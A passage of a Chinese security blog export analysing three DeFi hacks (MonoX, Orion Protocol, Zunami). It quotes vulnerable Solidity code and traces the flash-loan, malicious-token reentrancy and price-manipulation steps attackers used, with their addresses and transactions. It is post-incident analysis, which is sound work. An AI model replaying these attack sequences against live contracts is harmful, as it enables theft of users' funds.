class="line"></span><br><span class="line">  _updateVcashBalance(_token, _vcashIn, _vcashOut);</span><br><span class="line"></span><br><span class="line">  (uint poolValue, , ,) = getPool(_token);</span><br><span class="line"></span><br><span class="line">  require(initialPoolValue &lt;= poolValue || poolValue &gt;= poolSizeMinLimit,</span><br><span class="line">    &quot;MonoX:MIN_POOL_SIZE&quot;);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从代码中我们可以看出，将Monoswap池子中代币的数量和价格更新，其中代币的价格就是函数参数的<code>tokenInPrice</code>和<code>tokenOutPrice</code>,这两个参数都是通过<code>getAmountOut（）</code>函数计算得到，进入该函数，分析源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getAmountOut(address tokenIn, address tokenOut, </span><br><span class="line">    uint256 amountIn) public view returns (uint256 tokenInPrice, uint256 tokenOutPrice, </span><br><span class="line">    uint256 amountOut, uint256 tradeVcashValue) &#123;</span><br><span class="line">    require(amountIn &gt; 0, &#x27;MonoX:INSUFF_INPUT&#x27;);</span><br><span class="line">    </span><br><span class="line">    uint256 amountInWithFee = amountIn.mul(1e5-fees)/1e5;</span><br><span class="line">    address vcashAddress = address(vCash);</span><br><span class="line">    uint tokenInPoolPrice = pools[tokenIn].price;</span><br><span class="line">    uint tokenInPoolTokenBalance = pools[tokenIn].tokenBalance;</span><br><span class="line"></span><br><span class="line">    if(tokenIn==vcashAddress)&#123;</span><br><span class="line">      tradeVcashValue = amountInWithFee;</span><br><span class="line">      tokenInPrice = 1e18;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      require (tokenPoolStatus[tokenIn]==1, &quot;MonoX:NO_POOL&quot;);</span><br><span class="line">      // PoolInfo memory tokenInPool = pools[tokenIn];</span><br><span class="line">      PoolStatus tokenInPoolStatus = pools[tokenIn].status;</span><br><span class="line">      </span><br><span class="line">      require (tokenInPoolStatus != PoolStatus.UNLISTED, &quot;MonoX:POOL_UNLST&quot;);</span><br><span class="line">      </span><br><span class="line">      tokenInPrice = _getNewPrice(tokenInPoolPrice, tokenInPoolTokenBalance, </span><br><span class="line">        amountInWithFee, 0, TxType.SELL);</span><br><span class="line">      tradeVcashValue = _getAvgPrice(tokenInPoolPrice, tokenInPrice).mul(amountInWithFee)/1e18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(tokenOut==vcashAddress)&#123;</span><br><span class="line">      amountOut = tradeVcashValue;</span><br><span class="line">      tokenOutPrice = 1e18;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      require (tokenPoolStatus[tokenOut]==1, &quot;MonoX:NO_POOL&quot;);</span><br><span class="line">      // PoolInfo memory tokenOutPool = pools[tokenOut];</span><br><span class="line">      PoolStatus tokenOutPoolStatus = pools[tokenOut].status;</span><br><span class="line">      uint tokenOutPoolPrice = pools[tokenOut].price;</span><br><span class="line">      uint tokenOutPoolTokenBalance = pools[tokenOut].tokenBalance;</span><br><span class="line"></span><br><span class="line">      require (tokenOutPoolStatus != PoolStatus.UNLISTED, &quot;MonoX:POOL_UNLST&quot;);</span><br><span class="line">      </span><br><span class="line">      amountOut = tradeVcashValue.add(tokenOutPoolTokenBalance.mul(tokenOutPoolPrice).div(1e18));</span><br><span class="line">      amountOut = tradeVcashValue.mul(tokenOutPoolTokenBalance).div(amountOut);</span><br><span class="line"></span><br><span class="line">      bool allowDirectSwap=directSwapAllowed(tokenInPoolPrice,tokenOutPoolPrice,tokenInPoolTokenBalance,tokenOutPoolTokenBalance,tokenOutPoolStatus,true);</span><br><span class="line"></span><br><span class="line">      // assuming p1*p2 = k, equivalent to uniswap&#x27;s x * y = k</span><br><span class="line">      uint directSwapTokenOutPrice = allowDirectSwap?tokenInPoolPrice.mul(tokenOutPoolPrice).div(tokenInPrice):uint(-1);</span><br><span class="line"></span><br><span class="line">      // prevent the attack where user can use a small pool to update price in a much larger pool</span><br><span class="line">      tokenOutPrice = _getNewPrice(tokenOutPoolPrice, tokenOutPoolTokenBalance, </span><br><span class="line">        amountOut, 0, TxType.BUY);</span><br><span class="line">      tokenOutPrice = directSwapTokenOutPrice &lt; tokenOutPrice?directSwapTokenOutPrice:tokenOutPrice;</span><br><span class="line"></span><br><span class="line">      amountOut = tradeVcashValue.mul(1e18).div(_getAvgPrice(tokenOutPoolPrice, tokenOutPrice));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过上述代码可以得到，<code>tokenInPrice</code>和<code>tokenOutPrice</code>参数的计算都是通过<code>_getNewPrice（）</code>函数，得到函数源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _getNewPrice (uint256 originalPrice, uint256 reserve, </span><br><span class="line">  uint256 delta, uint256 deltaBlocks, TxType txType) pure internal returns(uint256 price) &#123;</span><br><span class="line">  if(txType==TxType.SELL) &#123;</span><br><span class="line">    // no risk of being div by 0</span><br><span class="line">    price = originalPrice.mul(reserve)/(reserve.add(delta));</span><br><span class="line">  &#125;else&#123; // BUY</span><br><span class="line">    price = originalPrice.mul(reserve).div(reserve.sub(delta));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过，我们可以发现tokenIn代币，其TxType为SELL，tokenOut代币其Txtype为BUY。</p>
<p>故可分析，tokenIn代表先进行价格更新计算，originalPrice和reserve都是池子中原来保存的参数，其不会发生变动，相较于originalPrice价格,tokenInPrice变低了。</p>
<p>分析<code>_getAvgPrice()</code>函数，我们进一步可以分析得到trashVcashValue也变低了，其与toknInPrice呈相同趋势。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _getAvgPrice (uint256 originalPrice, uint256 newPrice) pure internal returns(uint256 price) &#123;</span><br><span class="line">  price = originalPrice.add(newPrice.mul(4))/5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>随后，<code>getAmountOut（）</code>函数正常执行，计算tokenOut代币的相关信息，分析<code>_getNewPrice（）</code>函数，肯定可以得到的一个结论是相比于originalPrice也就是池子中代币的价格，tokenOutPrice变高的。</p>
<p>这时可以不用管其它参数的变化，这里最大的问题，就是这种同种代币的兑换，在<code>swapIn()</code>函数中，其先对tokenIn进行处理，更新代币相应的信息，但其后对tokenOut进行处理时，<em>没有考虑前后兑换为同一种代币的情况</em>，导致代币的价格被覆盖。</p>
<p>从上述分析中，可得到tokenOut的价格被抬升，tokenIn价格降低，但Mono的价格在兑换时，被覆盖，导致Mono价格异常增长。</p>
<p>对phalcon中兑换交易的参数分析可得，每次兑换的数量都是交易池中Mono的总量减去1，使得<code>_getNewPrice（）</code>函数计算tokenOutPrice时，能够快速提升价格，<strong>这里也就不能理解第3步中添加流动性的时候，添加很少的Mono</strong>，确保攻击者有足够的余额拉高mono的价格。</p>
<ol>
<li>转移非法资产</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312241051714.png" alt="image-20231224105100083"></p>
<p>攻击者先通过Monoswap查看池子中USDC的价格和余额，随后通过uniswap的USDC/WETH池接入WETH，乐观转账，在<code>uniswapV2call()</code>函数中调用Monoswap的<code>swapTokenForExactToken()</code>函数，将价格极高的Mono代币，换成一定数量的USDB，用以偿还uniswap闪电贷中的USDC（在uniswap闪电贷中，其可以通过还对应的pair代币），这样就将高价格的Mono代币转换成了对应的WETH（可以注意一下phalcon上这里的USDC数字，应该只是6位小数）。</p>
<p>随后的资产转移方式相同。</p>
]]></content>
      <categories>
        <category>Defi安全</category>
        <category>安全事件分析</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>安全事件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Defi安全--Orion Protocol攻击事件分析</title>
    <url>/2024/01/16/Defi%E5%AE%89%E5%85%A8-Orion-Protocol%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="1-Orion-Protocol攻击事件相关信息"><a href="#1-Orion-Protocol攻击事件相关信息" class="headerlink" title="1. Orion Protocol攻击事件相关信息"></a>1. Orion Protocol攻击事件相关信息</h2><p>2023年2月2日，在ETH和BSC上的Orion Protocol项目被攻击，这里以ETH上攻击为例：</p>
<ul>
<li>攻击合约地址：<a href="https://etherscan.io/address/0x5061f7e6dfc1a867d945d0ec39ea2a33f772380a">Attacker Contract Address | Etherscan</a></li>
<li>攻击者地址：<a href="https://etherscan.io/address/0x837962b686fd5a407fb4e5f92e8be86a230484bd">Orion Protocol Exploiter 2 | Address</a></li>
<li>攻击交易：<a href="https://etherscan.io/tx/0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa">Ethereum Transaction Hash (Txhash) Details | Etherscan</a></li>
<li>Phalcon调用序列分析：<a href="https://phalcon.blocksec.com/explorer/tx/eth/0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa">0xa6f63fcb6bec881886 | Phalcon Explorer (blocksec.com)</a></li>
</ul>
<h2 id="2-Orion-Protocol攻击事件分析"><a href="#2-Orion-Protocol攻击事件分析" class="headerlink" title="2. Orion Protocol攻击事件分析"></a>2. Orion Protocol攻击事件分析</h2><h3 id="攻击流程详解"><a href="#攻击流程详解" class="headerlink" title="攻击流程详解"></a>攻击流程详解</h3><p>Eth上的攻击交易<a href="https://etherscan.io/tx/0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa">Ethereum Transaction Hash (Txhash) Details | Etherscan</a></p>
<p>从中我们可以看出，input data为单纯的函数签名，没有参数，只是调用了一个攻击函数</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401161126161.png" alt="image-20240116111931103"></p>
<p>查看对应的phalcon调用序列：</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401161126931.png" alt="image-20240116112006459"></p>
<ol>
<li>先进行了一系列基础操作，对Orion Protocol项目合约进行一系列的代币授权approve(）操作，如USDT和USDC等。</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401161128941.png" alt="image-20240116112824996"></p>
<ol>
<li>随后我们可以看到攻击者调用了Orion Protocol的<code>depositAsset</code>函数，看一下该函数的源码：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function depositAsset(address assetAddress, uint112 amount) external &#123;</span><br><span class="line">    uint256 actualAmount = IERC20(assetAddress).balanceOf(address(this));</span><br><span class="line">    IERC20(assetAddress).safeTransferFrom(</span><br><span class="line">        msg.sender,</span><br><span class="line">        address(this),</span><br><span class="line">        uint256(amount)</span><br><span class="line">    );</span><br><span class="line">    actualAmount = IERC20(assetAddress).balanceOf(address(this)) - actualAmount;</span><br><span class="line">    generalDeposit(assetAddress, uint112(actualAmount));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>攻击者向orion Protocol合约转入对应数量的USDC，将该合约转账前后的代币余额，作为用户存款的数量，并调用<code>generateDeposit</code>函数，这一步USDC的存款是为后续的攻击做准备。</li>
<li>攻击者调用Uniswap V2: USDT的闪电贷函数，借出200多万个USDT</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401161134520.png" alt="image-20240116113406567"></p>
<ol>
<li>调用uniswapv2的闪电贷函数，借贷对应的USDT，乐观转账，先将对应的USDT转账给了攻击者，后回调攻击者的<code>uniswapV2Call</code>函数</li>
<li>回调函数中，因为攻击者先前存入了USDC，现在攻击者调用了orion Protocol项目ExchangeWithAtomic合约中的一个函数<code>swapThroughOrionPool</code>，orion Protocol提供的代币交换函数，代币兑换路径为[USDC,  ATK,  USDT]，其中ATK为攻击者提前创建的恶意代币，将USDC兑换成USDT</li>
<li>随后调用LibPool的doSwapThroughOrionPool的函数，再调用PoolFunctionality 合约中的doSwapThroughOrionPool函数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapThroughOrionPool(</span><br><span class="line">    uint112     amount_spend,</span><br><span class="line">    uint112     amount_receive,</span><br><span class="line">    address[]   calldata path,</span><br><span class="line">    bool        is_exact_spend</span><br><span class="line">) public payable nonReentrant &#123;</span><br><span class="line">    bool isCheckPosition = LibPool.doSwapThroughOrionPool(</span><br><span class="line">        IPoolFunctionality.SwapData(&#123;</span><br><span class="line">            amount_spend: amount_spend,</span><br><span class="line">            amount_receive: amount_receive,</span><br><span class="line">            is_exact_spend: is_exact_spend,</span><br><span class="line">            supportingFee: false,</span><br><span class="line">            path: path,</span><br><span class="line">            orionpool_router: _orionpoolRouter,</span><br><span class="line">            isInContractTrade: false,</span><br><span class="line">            isSentETHEnough: false,</span><br><span class="line">            isFromWallet: false,</span><br><span class="line">            asset_spend: address(0)</span><br><span class="line">        &#125;),</span><br><span class="line">        assetBalances, liabilities);</span><br></pre></td></tr></table></figure>
<ol>
<li><p>进一步调用PoolFunctionality 合约中的 doSwapThroughOrionPool 函数，仔细看一下函数源码，该函数进一步调用了_doSwapTokens（）函数</p>
</li>
<li><p>上述代码中_doSwapTokens()函数时进行相应的输入，输出代币数量的计算，跟进该函数的实现</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _doSwapTokens(InternalSwapData memory swapData) internal returns (uint256 amountIn, uint256 amountOut) &#123;</span><br><span class="line">    bool isLastWETH = swapData.path[swapData.path.length - 1] == WETH;</span><br><span class="line">    address toAuto = isLastWETH || swapData.curFactoryType == FactoryType.CURVE ? address(this) : swapData.to;</span><br><span class="line">    uint256[] memory amounts;</span><br><span class="line">    if (!swapData.supportingFee) &#123;</span><br><span class="line">        if (swapData.isExactIn) &#123;</span><br><span class="line">            amounts = OrionMultiPoolLibrary.getAmountsOut(</span><br><span class="line">                swapData.curFactory,</span><br><span class="line">                swapData.curFactoryType,</span><br><span class="line">                swapData.amountIn,</span><br><span class="line">                swapData.path</span><br><span class="line">            );</span><br><span class="line">            require(amounts[amounts.length - 1] &gt;= swapData.amountOut, &quot;PoolFunctionality: IOA&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            amounts = OrionMultiPoolLibrary.getAmountsIn(</span><br><span class="line">                swapData.curFactory,</span><br><span class="line">                swapData.curFactoryType,</span><br><span class="line">                swapData.amountOut,</span><br><span class="line">                swapData.path</span><br><span class="line">            );</span><br><span class="line">            require(amounts[0] &lt;= swapData.amountIn, &quot;PoolFunctionality: EIA&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        amounts = new uint256[](1);</span><br><span class="line">        amounts[0] = swapData.amountIn;</span><br><span class="line">    &#125;</span><br><span class="line">    amountIn = amounts[0];</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        uint256 curBalance;</span><br><span class="line">        address initialTransferSource = swapData.curFactoryType == FactoryType.CURVE ? address(this)</span><br><span class="line">            : OrionMultiPoolLibrary.pairFor(swapData.curFactory, swapData.path[0], swapData.path[1]);</span><br><span class="line"></span><br><span class="line">        if (swapData.supportingFee) curBalance = IERC20(swapData.path[0]).balanceOf(initialTransferSource);</span><br><span class="line"></span><br><span class="line">        IPoolSwapCallback(msg.sender).safeAutoTransferFrom(</span><br><span class="line">            swapData.asset_spend,</span><br><span class="line">            swapData.user,</span><br><span class="line">            initialTransferSource,</span><br><span class="line">            amountIn</span><br><span class="line">        );</span><br><span class="line">        if (swapData.supportingFee) amounts[0] = IERC20(swapData.path[0]).balanceOf(initialTransferSource) - curBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        uint256 curBalance = IERC20(swapData.path[swapData.path.length - 1]).balanceOf(toAuto);</span><br><span class="line">        //计算转账前的余额</span><br><span class="line">        if (swapData.curFactoryType == FactoryType.CURVE) &#123;</span><br><span class="line">            _swapCurve(swapData.curFactory, amounts, swapData.path, swapData.supportingFee);</span><br><span class="line">        &#125; else if (swapData.curFactoryType == FactoryType.UNISWAPLIKE) &#123;</span><br><span class="line">        //这里的swap函数完成相应的代币兑换</span><br><span class="line">            _swap(swapData.curFactory, amounts, swapData.path, toAuto, swapData.supportingFee);</span><br><span class="line">        &#125;</span><br><span class="line">        //将账户余额与转账前余额相减，得到新增的金额</span><br><span class="line">        amountOut = IERC20(swapData.path[swapData.path.length - 1]).balanceOf(toAuto) - curBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    require(</span><br><span class="line">        swapData.amountIn == 0 || swapData.amountOut == 0 ||</span><br><span class="line">        amountIn * 1e18 / swapData.amountIn &lt;= amountOut * 1e18 / swapData.amountOut,</span><br><span class="line">        &quot;PoolFunctionality: OOS&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    if (isLastWETH) &#123;</span><br><span class="line">        SafeTransferHelper.safeAutoTransferTo(</span><br><span class="line">            WETH,</span><br><span class="line">            address(0),</span><br><span class="line">            swapData.to,</span><br><span class="line">            amountOut</span><br><span class="line">        );</span><br><span class="line">    &#125; else if (swapData.curFactoryType == FactoryType.CURVE) &#123;</span><br><span class="line">        IERC20(swapData.path[swapData.path.length - 1]).safeTransfer(swapData.to, amountOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit OrionPoolSwap(</span><br><span class="line">        tx.origin,</span><br><span class="line">        convertFromWETH(swapData.path[0]),</span><br><span class="line">        convertFromWETH(swapData.path[swapData.path.length - 1]),</span><br><span class="line">        swapData.amountIn,</span><br><span class="line">        amountIn,</span><br><span class="line">        swapData.amountOut,</span><br><span class="line">        amountOut,</span><br><span class="line">        swapData.curFactory</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>这里进行相应的代币兑换，之前的兑换path为[USDC,  ATK,  USDT]，这里通过PoolFunctionality合约中的_swap()完成相应的兑换，跟进 _swap()函数的源码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _swap(</span><br><span class="line">    address curFactory,</span><br><span class="line">    uint256[] memory amounts,</span><br><span class="line">    address[] memory path,</span><br><span class="line">    address _to,</span><br><span class="line">    bool supportingFee</span><br><span class="line">) internal &#123;</span><br><span class="line">    for (uint256 i; i &lt; path.length - 1; ++i) &#123;</span><br><span class="line">        (address input, address output) = (path[i], path[i + 1]);</span><br><span class="line">        IOrionPoolV2Pair pair = IOrionPoolV2Pair(OrionMultiPoolLibrary.pairFor(curFactory, input, output));</span><br><span class="line">        (address token0, ) = OrionMultiPoolLibrary.sortTokens(input, output);</span><br><span class="line">        uint256 amountOut;</span><br><span class="line"></span><br><span class="line">        if (supportingFee) &#123;</span><br><span class="line">            (uint reserve0, uint reserve1,) = pair.getReserves();</span><br><span class="line">            (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);</span><br><span class="line">            uint256 amountIn = IERC20(input).balanceOf(address(pair)).sub(reserveInput);</span><br><span class="line">            amountOut = OrionMultiPoolLibrary.getAmountOutUv2(amountIn, reserveInput, reserveOutput);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            amountOut = amounts[i + 1];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (uint256 amount0Out, uint256 amount1Out) = input == token0 ? (uint256(0), amountOut) : (amountOut, uint256(0));</span><br><span class="line">        address to = i &lt; path.length - 2 ? OrionMultiPoolLibrary.pairFor(curFactory, output, path[i + 2]) : _to;</span><br><span class="line"></span><br><span class="line">        pair.swap(amount0Out, amount1Out, to, new bytes(0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401161429293.png" alt="image-20240116142931330"></p>
<ol>
<li><p>path序列中的[USDC,  ATK,  USDT]，每两个代币对之间存在一个pair合约，即USDC转到ATK，ATK转到对应的USDT，实现对应的代币兑换，攻击者创建的pair对合约，这里通过相应的计算金融模型，得到对应的转账金额，调用pair合约中的swap函数，实现相应的代币转移。</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401161500400.png" alt="image-20240116150016939"></p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401161514261.png" alt="image-20240116151407776"></p>
</li>
<li><p>由于pair对中的swap函数，进行相应的转账，需要调用ATK代币的转账函数，ATK是攻击者部署的恶意代币，攻击者可控，攻击者这里调用自身的deposit()函数，调用ExchangeWithAtomic合约的depositAsset函数，并将闪电贷得到的200多万USDT全部转进Orion Protocol的depositAsset()函数中</p>
</li>
<li><p>这时攻击者在ExchangeWithAtomic 合约中USDT的存款被记账为了200多万，原来ExchangeWithAtomic 合约的余额为200多万，两者数值相近（攻击者设计的）</p>
</li>
<li><p>而通过<code>swapThroughOrionPool</code>函数中攻击者USDC兑换出多少的USDT最终是通过ExchangeWithAtomic 合约兑换前后的USDT余额计算的，相当于存入的200万USDT被认为是USDC兑换出来的，最后通过creditUserAssets 函数来更新ExchangeWithAtomic 维护的adress-balance的账本，攻击者被认为是存入了200+200万</p>
</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401161515801.png" alt="image-20240116151533445"></p>
<ol>
<li>攻击者进行相应的闪电贷还款，归还借出的200多万，获利200多万</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401161516963.png" alt="image-20240116151634701"></p>
<ol>
<li>调用闪电贷，借出WETH，归还USDT，实现对应的套利离场</li>
</ol>
<h3 id="攻击事件发生的主要原因"><a href="#攻击事件发生的主要原因" class="headerlink" title="攻击事件发生的主要原因"></a>攻击事件发生的主要原因</h3><ul>
<li>doswapThroughOrionPool 函数，兑换路径攻击者可控，代币类型攻击者可控（恶意代币）</li>
<li>兑换后更新账本的记账方式不正确，利用前后余额计算（×）</li>
<li>合约兑换功能的函数没有做重入保护</li>
</ul>
<h2 id="3-分析Orion-Protocol攻击事件所需信息"><a href="#3-分析Orion-Protocol攻击事件所需信息" class="headerlink" title="3.  分析Orion Protocol攻击事件所需信息"></a>3.  分析Orion Protocol攻击事件所需信息</h2><ol>
<li>最关键的一点，重入的发生回调不在这个攻击合约之中，在攻击者创建的恶意代币合约之中（可能是这个案例的特殊情况）</li>
<li>普适的一点：触发恶意合约回调的功能，是在经过5次外部函数调用后，才最终调用到攻击者的恶意代币合约中的函数，在我们的工具中是无法获得这样的调用过程，全路径覆盖不太现实。</li>
</ol>
]]></content>
      <categories>
        <category>Defi安全</category>
        <category>安全事件分析</category>
      </categories>
      <tags>
        <tag>Defi安全</tag>
        <tag>安全事件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Defi安全--Zunami Protocol攻击事件分析</title>
    <url>/2024/01/12/Defi%E5%AE%89%E5%85%A8--Zunami%20Protocol%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="1-Zunami攻击事件相关信息"><a href="#1-Zunami攻击事件相关信息" class="headerlink" title="1  Zunami攻击事件相关信息"></a>1  Zunami攻击事件相关信息</h2><p>2023.8.13发生在Ethereum上发生的攻击，存在两个攻击交易，具体信息如下：</p>
<ul>
<li>攻击合约地址：<a href="https://etherscan.io/address/0xa21a2b59d80dc42d332f778cbb9ea127100e5d75#code">Contract Address 攻击合约</a></li>
<li>攻击者地址：<a href="https://etherscan.io/address/0x5f4c21c9bb73c8b4a296cc256c0cde324db146df">Zunami Protocol Exploiter</a></li>
<li>攻击交易hash1：<a href="https://etherscan.io/tx/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb">Ethereum Transaction Hash (Txhash) Details | Etherscan</a></li>
<li><p>攻击交易hash2：<a href="https://etherscan.io/tx/0x2aec4fdb2a09ad4269a410f2c770737626fb62c54e0fa8ac25e8582d4b690cca">Ethereum Transaction Hash (Txhash) Details | Etherscan</a></p>
</li>
<li><p>phalcon分析调用序列：<a href="https://phalcon.blocksec.com/explorer/tx/eth/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb">0x0788ba222970c7c68a | Phalcon Explorer (blocksec.com)</a></p>
</li>
</ul>
<h2 id="2-攻击流程详解"><a href="#2-攻击流程详解" class="headerlink" title="2  攻击流程详解"></a>2  攻击流程详解</h2><h3 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h3><p>Zunami是稳定币投资聚合器，用户给定用ETH/USDC/DAI等稳定币投资Zunami协议；</p>
<p>然后Zunami协议会使用用户质押的代币到Curve中高收益的池子进行质押；</p>
<p>那么为了保证更进一步的收益，Zunami还会把Curve的流动性再次质押到StakeDAO和Convex平台中，吃两波流动性奖励。</p>
<p>然后把收到的流动性奖励代币(CRV)经过用户的质押比例返回给用户。</p>
<p>zETH是Zunami协议实现的变基代币(rebase token)，变基代币的逻辑是因为他的代币数量计算是锚定了Zunami所有的资产来计算的，所以可以通过闪电贷对Zunami质押的池子买入卖出就可以影响zETH的数量计算</p>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>两次攻击交易是单独的，但是基于的漏洞及原理是一致的</p>
<p>以0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb攻击交易为例进行分析</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401121539252.png" alt="image-20240112153942369"></p>
<ol>
<li>对攻击交易进行调用序列分析，直接调用攻击合约中的函数；先查看了Balancer: Vault账户中USDC的余额</li>
<li>随后攻击者就调用UniswapV3中USDC-USDT对应的闪电贷函数，借出了7 e12wei的USDT；随后查看pair对池子中的USDC和USDT的余额，乐观转账会将对应借贷转给用户。</li>
<li>闪电贷会回调攻击者的<code>uniswapV3FlashCallback</code>函数，回调中攻击者调用Balancer: Vault的flashloan函数，这里可以看一下这里的函数源码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(</span><br><span class="line">    IFlashLoanRecipient recipient,</span><br><span class="line">    IERC20[] memory tokens,</span><br><span class="line">    uint256[] memory amounts,</span><br><span class="line">    bytes memory userData</span><br><span class="line">) external override nonReentrant whenNotPaused </span><br></pre></td></tr></table></figure>
<p>看了一下源码，其功能无特别之处，就是一个闪电贷函数，不过这个函数可以一次借贷多个代币，用<code>tokens</code>和<code>amounts</code>表示对应的数组，先后乐观转账，后回调攻击者，在进行还款</p>
<ol>
<li>在Balancer: Vault的flashloan函数中，会查看对应的余额，进行相应的乐观转账，随后会再次回调到攻击者的<code>receiveFlashLoan</code>函数，此时用户已经通过借贷获得了大量的USDT、USDC以及ETH</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401121621089.png" alt="image-20240112162057959"></p>
<ol>
<li><p>随后攻击者给curve finance，sushiswap以及uniswap上很多factory和router合约地址进行相应的代币授权，并调用Curve Finance: Swap用USDC给池子中添加流动性，获得crvFRAX</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401121711714.png" alt="image-20240112171138441"></p>
</li>
<li><p>随后调用Curve.fi Factory Pool中的一些pair对的exchange()函数，DEX智能合约的代币交换功能，可以把vyper代码直接放到GPT中解析，可以理解为就算进行代币的交换，攻击者将对应的crvFRAX兑换为Zunami UZD，将USDC兑换为crvUSD。此时用户拥有UZD和crvUSD</p>
</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401121720061.png" alt="image-20240112172018837"></p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401121729436.png" alt="image-20240112172948516"></p>
<ol>
<li>攻击再次调用exchange()函数，将所有的crvUSD兑换为对应的UZD，最后攻击者拥有4873316数量的UZD,并且将自身的ETH换成对应的SDT，并且将全部的SDT转到<code>MIMCurveStakeDao</code>中（为什么要进行这样一个存款，可能跟攻击行为有关）<img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401121927672.png" alt="image-20240112174205177"></li>
<li><p>随后调用SushiSwap: Router的<code>swapExactTokensForTokens</code>函数，进行代币的交换，攻击者首先将自身的WETH兑换为对应的SDT，随后将步骤2中通过闪电贷获得的USDT全部兑换为WETH</p>
</li>
<li><p>攻击者调用UZD合约的cacheAssetPrice()函数,仔细看一下函数源码，获得UZD缓存的资产价格，源码如下：</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function cacheAssetPrice() public virtual &#123;</span><br><span class="line">    _blockCached = block.number;</span><br><span class="line">    uint256 currentAssetPrice = assetPrice();</span><br><span class="line">    if (_assetPriceCached &lt; currentAssetPrice) &#123;</span><br><span class="line">        _assetPriceCached = currentAssetPrice;</span><br><span class="line">        emit CachedAssetPrice(_blockCached, _assetPriceCached);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>可以看出对应的<code>_assetPriceCached</code>的价格是由assetPrice()决定的，进一步阅读函数源码</li>
</ol>
